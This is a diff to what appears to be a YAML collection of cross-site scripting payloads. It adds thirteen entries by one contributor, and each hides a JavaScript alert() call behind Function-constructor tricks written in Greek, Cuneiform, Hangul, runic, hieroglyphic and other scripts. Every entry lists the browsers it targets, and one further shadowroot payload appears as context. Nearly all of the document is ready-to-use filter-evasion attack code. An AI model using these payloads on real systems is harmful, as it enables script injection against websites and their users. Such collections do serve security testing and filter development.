@@ -9828,6 +9828,153 @@ payloads:
     browsers: ["Chrome", "Firefox", "Safari", "Edge"]
     date_added: "31-12-2025"
 
+  # === CONTRIBUTIONS FROM yassinmohamed1111 ===
+  # International script-based obfuscation payloads
+  # Credit: https://github.com/yassinmohamed1111
+
+  - code: |
+      α='',β=!α+α,γ=!β+α,δ=α+{},ε=β[α++],ζ=β[ι=α],η=++ι+α,θ=δ[ι+η],β[θ+=δ[α]+(β.γ+δ)[α]+γ[η]+ε+ζ+β[ι]+θ+ε+δ[α]+ζ][θ](γ[α]+γ[ι]+β[η]+ζ+ε+"('Ĥαcεκd βγ γαssιη')")()
+    description: "XSS payload written in Ancient Greek alphabet using JavaScript variable obfuscation"
+    category: "non-english"
+    contributor: "Yassin Mohamed"
+    github_username: "yassinmohamed1111"
+    country: "Egypt"
+    tags: ["greek", "ancient", "obfuscation", "international", "unicode", "javascript"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "12-08-2026"
+
+  - code: |
+      𒀀='',𒀁=!𒀀+𒀀,𒀂=!𒀁+𒀀,𒀃=𒀀+{},𒀄=𒀁[𒀀++],𒀅=𒀁[𒀆=𒀀],𒀇=++𒀆+𒀀,𒀈=𒀃[𒀆+𒀇],𒀁[𒀈+=𒀃[𒀀]+(𒀁.𒀂+𒀃)[𒀀]+𒀂[𒀇]+𒀄+𒀅+𒀁[𒀆]+𒀈+𒀄+𒀃[𒀀]+𒀅][𒀈](𒀂[𒀀]+𒀂[𒀆]+𒀁[𒀇]+𒀅+𒀄+"('𒀭𒅆𒀀𒊕𒆳𒄿𒀀𒀸𒅋𒉌𒆠𒄑𒊮𒀀𒀭𒂗𒆠𒋛𒀀𒈨𒄿')")()
+    description: "XSS payload written in Cuneiform alphabet for extreme obfuscation"
+    category: "non-english"
+    contributor: "Yassin Mohamed"
+    github_username: "yassinmohamed1111"
+    country: "Egypt"
+    tags: ["cuneiform", "ancient", "sumerian", "obfuscation", "unicode", "javascript"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "12-08-2026"
+
+  - code: |
+      ᐊ='',ᐃ=!ᐊ+ᐊ,ᐅ=!ᐃ+ᐊ,ᐱ=ᐊ+{},ᑎ=ᐃ[ᐊ++],ᓇ=ᐃ[ᓕ=ᐊ],ᓯ=++ᓕ+ᐊ,ᓂ=ᐱ[ᓕ+ᓯ],ᐃ[ᓂ+=ᐱ[ᐊ]+(ᐃ.ᐅ+ᐱ)[ᐊ]+ᐅ[ᓯ]+ᑎ+ᓇ+ᐃ[ᓕ]+ᓂ+ᑎ+ᐱ[ᐊ]+ᓇ][ᓂ](ᐅ[ᐊ]+ᐅ[ᓕ]+ᐃ[ᓯ]+ᓇ+ᑎ+"('ᐊᐃᓐᓇᓂᐅᑦ ᐱᔭᓯᓕᖅ')")()
+    description: "XSS payload written in Inuktitut Canadian Aboriginal syllabics"
+    category: "non-english"
+    contributor: "Yassin Mohamed"
+    github_username: "yassinmohamed1111"
+    country: "Egypt"
+    tags: ["inuktitut", "aboriginal", "canadian", "obfuscation", "unicode", "javascript"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "12-08-2026"
+
+  - code: |
+      Ⰰ='',Ⰱ=!Ⰰ+Ⰰ,Ⰲ=!Ⰱ+Ⰰ,Ⰳ=Ⰰ+{},Ⰴ=Ⰱ[Ⰰ++],Ⰵ=Ⰱ[Ⰶ=Ⰰ],Ⰷ=++Ⰶ+Ⰰ,Ⰸ=Ⰳ[Ⰶ+Ⰷ],Ⰱ[Ⰸ+=Ⰳ[Ⰰ]+(Ⰱ.Ⰲ+Ⰳ)[Ⰰ]+Ⰲ[Ⰷ]+Ⰴ+Ⰵ+Ⰱ[Ⰶ]+Ⰸ+Ⰴ+Ⰳ[Ⰰ]+Ⰵ][Ⰸ](Ⰲ[Ⰰ]+Ⰲ[Ⰶ]+Ⰱ[Ⰷ]+Ⰵ+Ⰴ+"('ⰀⰁⰂⰃⰄⰅⰆⰇⰈ')")()
+    description: "XSS payload written in Glagolitic script (oldest known Slavic alphabet)"
+    category: "non-english"
+    contributor: "Yassin Mohamed"
+    github_username: "yassinmohamed1111"
+    country: "Egypt"
+    tags: ["glagolitic", "slavic", "ancient", "obfuscation", "unicode", "javascript"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "12-08-2026"
+
+  - code: |
+      𐀀='',𐀁=!𐀀+𐀀,𐀂=!𐀁+𐀀,𐀃=𐀀+{},𐀄=𐀁[𐀀++],𐀅=𐀁[𐀆=𐀀],𐀇=++𐀆+𐀀,𐀈=𐀃[𐀆+𐀇],𐀁[𐀈+=𐀃[𐀀]+(𐀁.𐀂+𐀃)[𐀀]+𐀂[𐀇]+𐀄+𐀅+𐀁[𐀆]+𐀈+𐀄+𐀃[𐀀]+𐀅][𐀈](𐀂[𐀀]+𐀂[𐀆]+𐀁[𐀇]+𐀅+𐀄+"('𐀀𐀁𐀂𐀃𐀄 𐀅𐀆𐀇𐀈')")()
+    description: "XSS payload written in Linear B (ancient Mycenaean Greek script)"
+    category: "non-english"
+    contributor: "Yassin Mohamed"
+    github_username: "yassinmohamed1111"
+    country: "Egypt"
+    tags: ["linear-b", "mycenaean", "greek", "ancient", "obfuscation", "unicode", "javascript"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "12-08-2026"
+
+  - code: |
+      ᚠ='',ᚢ=!ᚠ+ᚠ,ᚦ=!ᚢ+ᚠ,ᚨ=ᚠ+{},ᚱ=ᚢ[ᚠ++],ᚲ=ᚢ[ᚷ=ᚠ],ᚹ=++ᚷ+ᚠ,ᚺ=ᚨ[ᚷ+ᚹ],ᚢ[ᚺ+=ᚨ[ᚠ]+(ᚢ.ᚦ+ᚨ)[ᚠ]+ᚦ[ᚹ]+ᚱ+ᚲ+ᚢ[ᚷ]+ᚺ+ᚱ+ᚨ[ᚠ]+ᚲ][ᚺ](ᚦ[ᚠ]+ᚦ[ᚷ]+ᚢ[ᚹ]+ᚲ+ᚱ+"('ᛞᚾᛋᚨᛏᛡᚠᛚᛖᚺᛋᛉᛏᚱ')")()
+    description: "XSS payload written in Elder Futhark Runic script (Germanic runes)"
+    category: "non-english"
+    contributor: "Yassin Mohamed"
+    github_username: "yassinmohamed1111"
+    country: "Egypt"
+    tags: ["runic", "futhark", "norse", "germanic", "obfuscation", "unicode", "javascript"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "12-08-2026"
+
+  - code: |
+      ꆈ='',ꌠ=!ꆈ+ꆈ,ꁱ=!ꌠ+ꆈ,ꁯ=ꆈ+{},ꉬ=ꌠ[ꆈ++],ꃅ=ꌠ[ꋍ=ꆈ],ꇁ=++ꋍ+ꆈ,ꊰ=ꁯ[ꋍ+ꇁ],ꌠ[ꊰ+=ꁯ[ꆈ]+(ꌠ.ꁱ+ꁯ)[ꆈ]+ꁱ[ꇁ]+ꉬ+ꃅ+ꌠ[ꋍ]+ꊰ+ꉬ+ꁯ[ꆈ]+ꃅ][ꊰ](ꁱ[ꆈ]+ꁱ[ꋍ]+ꌠ[ꇁ]+ꃅ+ꉬ+"('ꆈꌠꁱꁯꉬꃅꋍꇁꊰꌠꁱꉬꇁꊰꆈꋍꁯꃅꆈꌠꁱꁯꉬꃅꋍꇁꊰ')")()
+    description: "XSS payload written in Yi script (used by Yi people of China)"
+    category: "non-english"
+    contributor: "Yassin Mohamed"
+    github_username: "yassinmohamed1111"
+    country: "Egypt"
+    tags: ["yi", "chinese-minority", "ancient", "obfuscation", "unicode", "javascript"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "12-08-2026"
+
+  - code: |
+      𓀀='',𓁹=!𓀀+𓀀,𓆣=!𓁹+𓀀,𓉐=𓀀+{},𓂀=𓁹[𓀀++],𓏏=𓁹[𓀂=𓀀],𓎛=++𓀂+𓀀,𓅓=𓉐[𓀂+𓎛],𓁹[𓅓+=𓉐[𓀀]+(𓁹.𓆣+𓉐)[𓀀]+𓆣[𓎛]+𓂀+𓏏+𓁹[𓀂]+𓅓+𓂀+𓉐[𓀀]+𓏏][𓅓](𓆣[𓀀]+𓆣[𓀂]+𓁹[𓎛]+𓏏+𓂀+"('𓀀𓁹𓆣𓉐𓂀𓏏𓎛𓅓')")()
+    description: "XSS payload written in Egyptian Hieroglyphics for exotic obfuscation"
+    category: "non-english"
+    contributor: "Yassin Mohamed"
+    github_username: "yassinmohamed1111"
+    country: "Egypt"
+    tags: ["hieroglyphics", "egyptian", "ancient", "obfuscation", "unicode", "javascript"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "12-08-2026"
+
+  - code: |
+      가='',나=!가+가,다=!나+가,라=가+{},마=나[가++],바=나[사=가],아=++사+가,자=라[사+아],나[자+=라[가]+(나.다+라)[가]+다[아]+마+바+나[사]+자+마+라[가]+바][자](다[가]+다[사]+나[아]+바+마+"('바로 나, 이 빌어먹을 염소한테 해킹당했지.')")()
+    description: "XSS payload written in Korean Hangul script with localized alert message"
+    category: "non-english"
+    contributor: "Yassin Mohamed"
+    github_username: "yassinmohamed1111"
+    country: "Egypt"
+    tags: ["korean", "hangul", "obfuscation", "international", "unicode", "javascript"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "12-08-2026"
+
+  - code: |
+      𝒜='',ℬ=!𝒜+𝒜,𝒞=!ℬ+𝒜,𝒟=𝒜+{},ℰ=ℬ[𝒜++],ℱ=ℬ[𝒢=𝒜],ℋ=++𝒢+𝒜,ℐ=𝒟[𝒢+ℋ],ℬ[ℐ+=𝒟[𝒜]+(ℬ.𝒞+𝒟)[𝒜]+𝒞[ℋ]+ℰ+ℱ+ℬ[𝒢]+ℐ+ℰ+𝒟[𝒜]+ℱ][ℐ](𝒞[𝒜]+𝒞[𝒢]+ℬ[ℋ]+ℱ+ℰ+"('𝓱𝓪𝓬𝓴𝓮𝓭 𝓫𝔂 𝔂𝓪𝓼𝓼𝓲𝓷')")()
+    description: "XSS payload using Mathematical Script letters for stylized obfuscation"
+    category: "non-english"
+    contributor: "Yassin Mohamed"
+    github_username: "yassinmohamed1111"
+    country: "Egypt"
+    tags: ["mathematical", "script", "fancy", "obfuscation", "unicode", "javascript"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "12-08-2026"
+
+  - code: |
+      Ａ='',Ｂ=!Ａ+Ａ,Ｃ=!Ｂ+Ａ,Ｄ=Ａ+{},Ｅ=Ｂ[Ａ++],Ｆ=Ｂ[Ｇ=Ａ],Ｈ=++Ｇ+Ａ,Ｉ=Ｄ[Ｇ+Ｈ],Ｂ[Ｉ+=Ｄ[Ａ]+(Ｂ.Ｃ+Ｄ)[Ａ]+Ｃ[Ｈ]+Ｅ+Ｆ+Ｂ[Ｇ]+Ｉ+Ｅ+Ｄ[Ａ]+Ｆ][Ｉ](Ｃ[Ａ]+Ｃ[Ｇ]+Ｂ[Ｈ]+Ｆ+Ｅ+"('Hacked By Yassin')")()
+    description: "XSS payload using Fullwidth Latin characters"
+    category: "non-english"
+    contributor: "Yassin Mohamed"
+    github_username: "yassinmohamed1111"
+    country: "Egypt"
+    tags: ["fullwidth", "latin", "obfuscation", "unicode", "javascript"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "12-08-2026"
+
+  - code: |
+      λ='',ψ=!λ+λ,χ=!ψ+λ,Ϟ=λ+{},ϟ=ψ[λ++],Ϡ=ψ[ϡ=λ],Ϣ=++ϡ+λ,ϣ=Ϟ[ϡ+Ϣ],ψ[ϣ+=Ϟ[λ]+(ψ.χ+Ϟ)[λ]+χ[Ϣ]+ϟ+Ϡ+ψ[ϡ]+ϣ+ϟ+Ϟ[λ]+Ϡ][ϣ](χ[λ]+χ[ϡ]+ψ[Ϣ]+Ϡ+ϟ+"('⟊⟒⫯⫸⧉⧬⩣⪬⨀⩘⫛⟆⧆⧈⪻⫷⩚⟟')")()
+    description: "XSS payload using Greek Coptic letters with mathematical symbols in alert"
+    category: "non-english"
+    contributor: "Yassin Mohamed"
+    github_username: "yassinmohamed1111"
+    country: "Egypt"
+    tags: ["coptic", "greek", "mathematical", "obfuscation", "unicode", "javascript"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "12-08-2026"
+
+  - code: |
+      ツ='',ಠ=!ツ+ツ,益=!ಠ+ツ,ʘ=ツ+{},ヘ=ಠ[ツ++],눈=ಠ[ಠ_=ツ],益益=++ಠ_+ツ,凸=ʘ[ಠ_+益益],ಠ[凸+=ʘ[ツ]+(ಠ.益+ʘ)[ツ]+益[益益]+ヘ+눈+ಠ[ಠ_]+凸+ヘ+ʘ[ツ]+눈][凸](益[ツ]+益[ಠ_]+ಠ[益益]+눈+ヘ+"('(☞ﾟヮﾟ)☞ Hacked By Yassin ☜(ﾟヮﾟ☜)')")()
+    description: "XSS payload using emoticon/Lenny face characters mixed with multi-script variables"
+    category: "non-english"
+    contributor: "Yassin Mohamed"
+    github_username: "yassinmohamed1111"
+    country: "Egypt"
+    tags: ["emoticon", "lenny", "mixed-script", "obfuscation", "unicode", "javascript"]
+    browsers: ["Chrome", "Firefox", "Safari", "Edge"]
+    date_added: "12-08-2026"
+
   - code: |
       <template shadowrootmode=open><slot onslotchange=alert( )>
     description: "Template shadowroot mode XSS payload for DOM  manipulation"
